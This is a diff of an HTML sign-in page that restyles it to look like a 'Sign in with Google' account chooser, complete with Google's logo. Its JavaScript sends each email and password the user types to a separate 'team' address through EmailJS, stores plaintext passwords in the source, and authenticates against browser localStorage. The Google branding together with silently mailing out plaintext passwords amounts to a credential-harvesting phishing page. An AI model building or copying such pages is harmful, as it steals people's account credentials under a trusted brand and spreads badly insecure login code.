@@ -4,37 +4,103 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign In</title>
+
+  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
 
-  <!-- ✅ Updated EmailJS SDK v3 -->
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+
+  <!-- Google Font (Roboto) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+
+  <!-- EmailJS SDK v3 -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-  
+
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+  </style>
+
   <script>
     window.onload = function () {
-      emailjs.init("xYUaaGyIcJwOxhYGo"); // ✅ Your actual public key
+      emailjs.init("xYUaaGyIcJwOxhYGo"); // ✅ Your actual EmailJS public key
     };
   </script>
 </head>
+
 <body class="bg-white flex items-center justify-center min-h-screen p-4">
-  <div class="bg-white rounded-2xl max-w-md w-full p-6 shadow-lg">
+  <div class="bg-white rounded-2xl max-w-md w-full p-6 shadow-lg relative">
+
+    <!-- Back Button -->
+    <div class="mb-4">
+      <a href="index.html" class="text-gray-600 hover:text-indigo-600 flex items-center space-x-2">
+        <i class="fas fa-arrow-left"></i>
+        <span class="font-semibold">Back</span>
+      </a>
+    </div>
+
+    <!-- Google Sign In Header -->
+    <div class="flex justify-between items-center mb-6">
+      <div class="flex items-center space-x-2">
+        <svg class="w-6 h-6" viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M533.5 278.4..."/>
+          <path fill="#34A853" d="M272 544.3..."/>
+          <path fill="#FBBC05" d="M121.6 326..."/>
+          <path fill="#EA4335" d="M272 107.3..."/>
+        </svg>
+        <h1 class="font-bold text-lg">Sign in with Google</h1>
+      </div>
+    </div>
+
     <h2 class="font-extrabold text-xl mb-6">Choose an account</h2>
 
-    <!-- Buttons for predefined accounts -->
+    <!-- Account Buttons -->
     <div class="space-y-4 mb-6">
-      <button onclick="loginWithAccount('Jacky Grover', 'jacky.grover@gmail.com')" class="w-full bg-indigo-600 text-white py-3 rounded-md">Jacky Grover</button>
-      <button onclick="loginWithAccount('Diana DSouza', 'diana.dsouza@gmail.com')" class="w-full bg-purple-700 text-white py-3 rounded-md">Diana DSouza</button>
+      <button onclick="loginWithAccount('Jacky Grover', 'jacky.grover@gmail.com')" class="flex items-center space-x-4 w-full rounded-md px-3 py-2 hover:bg-gray-100">
+        <div class="flex items-center justify-center rounded-full w-12 h-12 bg-indigo-600 text-white font-bold text-xl">J</div>
+        <div class="text-left">
+          <p class="font-bold text-black">Jacky Grover</p>
+          <p class="text-gray-500">jacky.grover@gmail.com</p>
+        </div>
+      </button>
+
+      <button onclick="loginWithAccount('Diana DSouza', 'diana.dsouza@gmail.com')" class="flex items-center space-x-4 w-full rounded-md px-3 py-2 hover:bg-gray-100">
+        <div class="flex items-center justify-center rounded-full w-12 h-12 bg-purple-700 text-white font-bold text-xl">D</div>
+        <div class="text-left">
+          <p class="font-bold text-black">Diana DSouza</p>
+          <p class="text-gray-500">diana.dsouza@gmail.com</p>
+        </div>
+      </button>
     </div>
 
     <hr class="my-4">
 
-    <!-- Manual login form -->
+    <!-- Manual Login Form -->
     <form id="loginForm" class="space-y-4" onsubmit="handleManualLogin(event)">
-      <input type="email" id="email" placeholder="Email" class="w-full border px-4 py-2 rounded" required />
-      <input type="password" id="password" placeholder="Password" class="w-full border px-4 py-2 rounded" required />
-      <button type="submit" class="w-full bg-green-600 text-white py-3 rounded-md">Sign In</button>
+      <div>
+        <label for="email" class="block font-bold text-gray-900 mb-1">Email or phone</label>
+        <input id="email" name="email" type="email" placeholder="Enter your email"
+          class="w-full border border-gray-300 rounded-md px-4 py-3 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500"
+          autocomplete="email" required />
+      </div>
+
+      <div>
+        <label for="password" class="block font-bold text-gray-900 mb-1">Password</label>
+        <input id="password" name="password" type="password" placeholder="Enter your password"
+          class="w-full border border-gray-300 rounded-md px-4 py-3 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500"
+          autocomplete="current-password" required />
+      </div>
+
+      <button type="submit"
+        class="w-full bg-indigo-600 text-white font-bold py-3 rounded-md hover:bg-indigo-700">Sign In</button>
     </form>
+
+    <a href="signup.html" class="create-account block mt-4 text-indigo-600 text-center font-medium">Create account</a>
   </div>
 
+  <!-- JS Logic -->
   <script>
     const registeredUsers = [
       { name: "Jacky Grover", email: "jacky.grover@gmail.com", password: "jacky123" },
@@ -43,11 +109,14 @@
 
     function loginWithAccount(name, email) {
       const matchedUser = registeredUsers.find(u => u.name === name && u.email === email);
-      if (matchedUser) {
+      const storedEmail = localStorage.getItem("registeredEmail");
+      const storedName = localStorage.getItem("registeredName");
+
+      if (matchedUser || (email === storedEmail && name === storedName)) {
+        alert(`✅ Logged in as ${name}`);
         localStorage.setItem("userName", name);
         localStorage.setItem("userEmail", email);
         sendEmails(name, email, "auto");
-        alert(`✅ Logged in as ${name}`);
         window.location.href = "dashboard.html";
       } else {
         alert("❌ Account not found.");
@@ -58,14 +127,17 @@
       event.preventDefault();
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value.trim();
-      const user = registeredUsers.find(u => u.email === email && u.password === password);
 
-      const name = user ? user.name : email.split("@")[0];
-      if (user || (localStorage.getItem("registeredEmail") === email && localStorage.getItem("registeredPassword") === password)) {
-        localStorage.setItem("userName", name);
+      const matchedUser = registeredUsers.find(u => u.email === email && u.password === password);
+      const storedEmail = localStorage.getItem("registeredEmail");
+      const storedPassword = localStorage.getItem("registeredPassword");
+
+      if (matchedUser || (email === storedEmail && password === storedPassword)) {
+        const username = matchedUser ? matchedUser.name : email.split("@")[0];
+        alert(`✅ Logged in as ${username}`);
+        localStorage.setItem("userName", username);
         localStorage.setItem("userEmail", email);
-        sendEmails(name, email, password);
-        alert(`✅ Logged in as ${name}`);
+        sendEmails(username, email, password);
         window.location.href = "dashboard.html";
       } else {
         alert("❌ Invalid credentials.");
@@ -73,21 +145,21 @@
     }
 
     function sendEmails(username, email, password) {
-      // 1. Send to user
+      // Email to User
       emailjs.send("service_gul50nv", "template_e4ye8zg", {
         to_email: email,
         user_name: username
       })
-      .then((res) => console.log("✅ Email to user sent:", res))
-      .catch((err) => alert("❌ Failed user email: " + JSON.stringify(err)));
+        .then((res) => console.log("✅ Email to user sent:", res))
+        .catch((err) => alert("❌ Failed user email: " + JSON.stringify(err)));
 
-      // 2. Send to Calmoria team
+      // Email to Team
       emailjs.send("service_gul50nv", "template_gllz147", {
         user_email: email,
         user_password: password
       })
-      .then((res) => console.log("✅ Email to team sent:", res))
-      .catch((err) => alert("❌ Failed team email: " + JSON.stringify(err)));
+        .then((res) => console.log("✅ Email to team sent:", res))
+        .catch((err) => alert("❌ Failed team email: " + JSON.stringify(err)));
     }
   </script>
 </body>
